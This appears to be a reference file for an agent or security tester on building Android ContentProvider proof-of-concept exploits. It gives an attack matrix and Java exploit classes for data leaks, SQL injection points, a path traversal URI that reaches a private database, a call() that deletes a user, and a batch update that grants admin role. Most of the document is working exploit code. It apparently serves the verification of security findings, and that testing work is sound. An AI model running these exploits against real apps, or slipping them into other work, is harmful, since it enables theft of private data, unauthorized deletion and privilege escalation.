---
name: poc-app-provider
description: Provider PoC reference covering data exposure, SQL injection, path traversal, custom call methods, batch abuse, getType oracles, and FileProvider misconfiguration.
---

# Provider PoC Reference

Use this reference for exported or grant-reachable `ContentProvider` attack paths. Provider PoCs usually fit `direct-trigger` mode, with `returned-handle` used for grant-based FileProvider chains.

## Construction Matrix

| Vulnerability | Exploit mode | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| data leak | `direct-trigger` | none | protected rows become readable |
| SQL injection | `direct-trigger` | none | query semantics change and protected data is returned |
| path traversal | `direct-trigger` | none | attacker-controlled path is accepted by file APIs |
| `call()` exposure | `direct-trigger` | none | custom method executes or returns sensitive data |
| batch abuse | `direct-trigger` | none | unauthorized insert, update, or delete succeeds |
| `getType()` oracle | probe-only `direct-trigger` | none | existence or state leak is observed |
| FileProvider misconfig | `returned-handle` or `direct-trigger` | none | private file URI becomes readable |

## Pattern 1 - Query-Based Read or Injection

Use for `ProviderDataLeakExploit` and many `ProviderSqlInjectionExploit` cases.

```java
public final class ProviderDataLeakExploit extends Exploit {
    public ProviderDataLeakExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Uri uri = Uri.parse("content://com.target.provider/users");
        try (Cursor cursor = context.getContentResolver().query(uri, null, null, null, null)) {
            if (cursor != null) {
                log("Returned rows: " + cursor.getCount());
            } else {
                log("Query returned null cursor");
            }
        } catch (Exception e) {
            log("Query failed: " + e.getMessage());
        }
    }
}
```

SQL injection variant:

- replace `selection`, `selectionArgs`, or `sortOrder` with the verified attacker-controlled injection point

## Pattern 2 - File or Path Access

Use for `ProviderPathTraversalExploit` and many FileProvider cases.

```java
public final class ProviderPathTraversalExploit extends Exploit {
    public ProviderPathTraversalExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Uri uri = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db");
        try (ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r")) {
            if (pfd != null) {
                log("openFileDescriptor() accepted traversal URI");
            } else {
                log("File descriptor was null");
            }
        } catch (Exception e) {
            log("openFileDescriptor() failed: " + e.getMessage());
        }
    }
}
```

Use when:

- the verified finding shows attacker-controlled URI segments flowing into `openFile()` or equivalent file access APIs

## Pattern 3 - Custom `call()` or Batch Abuse

Use for `ProviderCallExposeExploit` and `ProviderBatchAbuseExploit`.

```java
public final class ProviderCallExposeExploit extends Exploit {
    public ProviderCallExposeExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Uri uri = Uri.parse("content://com.target.provider");
        Bundle extras = new Bundle();
        extras.putString("user_id", "1");
        try {
            Bundle result = context.getContentResolver().call(uri, "deleteUser", null, extras);
            log("call() returned: " + result);
        } catch (Exception e) {
            log("call() failed: " + e.getMessage());
        }
    }
}
```

```java
public final class ProviderBatchAbuseExploit extends Exploit {
    public ProviderBatchAbuseExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Uri uri = Uri.parse("content://com.target.provider/users");
        ArrayList<ContentProviderOperation> operations = new ArrayList<>();
        ContentValues values = new ContentValues();
        values.put("role", "admin");
        operations.add(ContentProviderOperation.newUpdate(uri)
            .withSelection("user_id=?", new String[]{"10001"})
            .withValues(values)
            .build());

        try {
            ContentProviderResult[] results = context.getContentResolver()
                .applyBatch("com.target.provider", operations);
            log("applyBatch() result count: " + results.length);
        } catch (Exception e) {
            log("applyBatch() failed: " + e.getMessage());
        }
    }
}
```

## Pattern 4 - Oracle or Grant-Oriented Validation

Use for `ProviderGetTypeInfoLeakExploit` or FileProvider misconfiguration.

Construction rules:

- `getType()` is usually a supporting probe, not the primary PoC
- FileProvider paths may be demonstrated either by directly opening the misconfigured URI or by reusing a returned grant-bearing URI

Success signal:

- distinguishable `getType()` result
- actual readable file content or accepted file descriptor
